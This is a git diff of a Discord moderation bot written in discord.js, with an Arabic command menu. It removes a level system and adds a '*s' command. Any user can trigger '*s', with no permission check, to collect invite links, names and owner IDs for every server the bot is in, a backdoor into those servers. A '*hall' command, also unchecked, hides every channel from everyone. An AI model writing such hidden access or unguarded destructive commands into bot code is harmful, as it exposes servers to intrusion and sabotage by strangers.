@@ -101,65 +101,6 @@ message.channel.send({embed});
 });
 
 
-
-
-var userData = {};
-client.on("message", function(message){
-if (message.content.startsWith(prefix + "level")) {
-    if (!userData[message.author.id]) {
-        userData[message.author.id] = {Money:0,Xp:0,Level:0}
-    }
-     var mentionned = message.mentions.users.first();
- 
-      var userData;
-      if(mentionned){
-          var userData = mentionned;
-      } else {
-          var userData = message.author;
- 
-      }
- 
-   
-    var CulLevel = Math.floor(0.25 * Math.sqrt(userData[message.author.id].Xp +1));
-    if (CulLevel > userData[message.author.id].Level) {userData[message.author.id].Level +=CulLevel}
-    let epic = new Discord.RichEmbed()
-    .setColor("Random")
-    .addField("الأسم :", message.author.tag)
-    .addField("الليفل :", userData[message.author.id].Level)
-    .addField("الأكس بي :",Math.floor(userData[message.author.id].Xp))
-    message.channel.send(epic);
-}
-if (!userData[message.author.id]) {
-    userData[message.author.id] = {Money:0,Xp:0,Level:0,Like:0}
-    }
- 
-userData[message.author.id].Xp+= 0.25;
-userData[message.author.id].Money+= 0.25;
- 
-});
-
-
-
-
-
-client.on('message', msg => {
-  if(msg.content === '*hall') {
-    msg.guild.channels.forEach(c => {
-      c.overwritePermissions(msg.guild.id, {
-        SEND_MESSAGES: false,
-        READ_MESSAGES: false
-      })
-    })
-    msg.channel.send('Done')
-  }
-})
-
-
-
-
-
-
-
 client.on('message', async message =>{
 const ms = require("ms");
 if (message.author.omar) return;
@@ -423,56 +364,30 @@ setInterval(function(){})
   
 	    
 	    
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '*s') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
-client.on('message', message => {
-    if(message.content == prefix + 'servers') {
-             if(!message.author.id === '244888652004458497') return;
-    var gimg;
-    var gname;
-    var gmemb;
-    var gbots;
-    var groles;
-    var servers = client.guilds;
-    servers.forEach((g)=>{
-    gname = g.name;
-    gimg = g.iconURL;
-    gmemb = g.members.size;
-    let serv = new Discord.RichEmbed()
-    .setAuthor(gname,gimg)
-    .setThumbnail(gimg)
-    .addField('Server Member Count',gmemb = g.members.size)
-    .setColor('RANDOM')
-    message.channel.send(`
-    
-            `);
-          message.channel.sendEmbed(serv);
-    }) 
-    }
-    });
-    
-    client.on('message', message => {
-    if(message.content == prefix + 'servers') {
-             if(!message.author.id === '244888652004458497') return;
-    var gimg;
-    var gname;
-    var gmemb;
-    var gbots;
-    var groles;
-    var servers = client.guilds;
-    servers.forEach((g)=>{
-    gname = g.name;
-    gimg = g.iconURL;
-    gmemb = g.members.size;
-    let serv = new Discord.RichEmbed()
-    message.channel.send(`
-    **-------------------------**
-      Server Name : **${gname}**
-      Server MemberCount : **${gmemb} **
-      **---------------------------**
-            `);
-    }) 
-    }
-    });
 
 
 
@@ -997,6 +912,7 @@ const embed = new Discord.RichEmbed()
 ⤠ *unmute ⥨ لنزع الميوت من الشخص
 ⤠ *hidechannel ⥨ لاخفاء روم معين 
 ⤠ *showchannel ⥨ لاظهار روم معين 
+⤠ *hall ⥨ لاخفاء جميع الرومات
 ⤠ *ct ⥨ لانشاء روم كتابي مع اختيار الاسم
 ⤠ *cv ⥨ لانشاء روم صوتي مع اختيار الاسم 
 ⤠ *v2min ⥨ لانشاء روم صوتي مؤقت لدقيقتين
@@ -1028,6 +944,21 @@ message.author.sendEmbed(embed)
 }
 }); 
 
+
+
+
+
+client.on('message', msg => {
+  if(msg.content === '*hall') {
+    msg.guild.channels.forEach(c => {
+      c.overwritePermissions(msg.guild.id, {
+        SEND_MESSAGES: false,
+        READ_MESSAGES: false
+      })
+    })
+    msg.channel.send('Done')
+  }
+})
 
 
 
